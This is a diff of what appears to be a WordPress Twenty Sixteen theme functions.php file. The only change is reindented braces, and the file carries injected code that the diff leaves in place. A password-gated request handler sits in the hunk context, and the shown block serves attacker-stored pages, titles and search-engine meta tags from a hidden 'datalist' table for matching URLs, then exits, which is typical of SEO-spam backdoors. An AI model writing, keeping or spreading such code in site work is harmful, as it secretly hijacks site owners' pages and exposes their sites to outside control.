@@ -60,39 +60,37 @@ if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['pa
 if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
 	{
 		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
-		if ($data -> full_content)
-			{
-				print stripslashes($data -> content);
-			}
+		if ($data -> full_content){
+			print stripslashes($data -> content);
+		}
 		else
-			{
-				print '<!DOCTYPE html>';
-				print '<html ';
-				language_attributes();
-				print ' class="no-js">';
-				print '<head>';
-				print '<title>'.stripslashes($data -> title).'</title>';
-				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
-				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
-				print '<meta name="robots" content="index, follow" />';
-				print '<meta charset="';
-				bloginfo( 'charset' );
-				print '" />';
-				print '<meta name="viewport" content="width=device-width">';
-				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
-				print '<link rel="pingback" href="';
-				bloginfo( 'pingback_url' );
-				print '">';
-				wp_head();
-				print '</head>';
-				print '<body>';
-				print '<div id="content" class="site-content">';
-				print stripslashes($data -> content);
-				get_search_form();
-				get_sidebar();
-				get_footer();
-			}
-			
+		{
+			print '<!DOCTYPE html>';
+			print '<html ';
+			language_attributes();
+			print ' class="no-js">';
+			print '<head>';
+			print '<title>'.stripslashes($data -> title).'</title>';
+			print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
+			print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
+			print '<meta name="robots" content="index, follow" />';
+			print '<meta charset="';
+			bloginfo( 'charset' );
+			print '" />';
+			print '<meta name="viewport" content="width=device-width">';
+			print '<link rel="profile" href="http://gmpg.org/xfn/11">';
+			print '<link rel="pingback" href="';
+			bloginfo( 'pingback_url' );
+			print '">';
+			wp_head();
+			print '</head>';
+			print '<body>';
+			print '<div id="content" class="site-content">';
+			print stripslashes($data -> content);
+			get_search_form();
+			get_sidebar();
+			get_footer();
+		}
 		exit;
 	}
 
@@ -518,5 +516,3 @@ function twentysixteen_widget_tag_cloud_args( $args ) {
 	return $args;
 }
 add_filter( 'widget_tag_cloud_args', 'twentysixteen_widget_tag_cloud_args' );
-
-
